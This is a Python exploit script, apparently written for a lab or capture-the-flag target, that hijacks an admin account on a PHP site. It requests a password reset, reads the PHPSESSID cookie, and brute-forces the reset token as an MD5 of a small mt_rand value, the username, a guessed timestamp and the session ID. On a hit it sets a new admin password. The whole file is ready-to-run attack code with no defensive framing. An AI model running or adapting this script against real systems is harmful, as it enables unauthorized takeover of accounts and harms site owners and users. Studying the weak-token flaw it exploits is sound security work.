import requests
import hashlib
import time
import itertools

TARGET_URL = "http://targetIP:8000"
USERNAME = "admin"
NEW_PASSWORD = "naberisnewpasswd"

def generate_possible_tokens(username, session_id, time_guess_range=5):
    current_time = int(time.time())

    for t_offset in range(-time_guess_range, time_guess_range + 1):
        for rand_num in range(1, 101):  # mt_rand(1,100) -> 100 ihtimal
            guess_time = current_time + t_offset
            token_str = f"{rand_num}{username}{guess_time}{session_id}"
            yield hashlib.md5(token_str.encode()).hexdigest()

def exploit():
    print("[+] Exploit started...")
    reset_request = requests.post(TARGET_URL, data={"user": USERNAME})
    if reset_request.status_code == 200:
        print("[+] Password reset request sent.")
    else:
        print("[-] Failed to request password reset.")
        return

    session_id = reset_request.cookies.get("PHPSESSID", "")
    if not session_id:
        print("[-] Failed to retrieve session ID.")
        return

    print(f"[+] Retrieved PHPSESSID: {session_id}")

    print("[+] Brute-forcing token...")
    for token in generate_possible_tokens(USERNAME, session_id):
        response = requests.post(TARGET_URL, data={"token": token, "newPassword": NEW_PASSWORD})
        
        if response.status_code == 200 and "Password changed!" in response.text:
            print(f"[+] Success! Token found: {token}")
            print(f"[+] {USERNAME}'s new password is now: {NEW_PASSWORD}")
            return
        else:
            print(f"[-] Tried token: {token}")

    print("[-] Failed to brute-force token.")

if __name__ == "__main__":
    exploit()
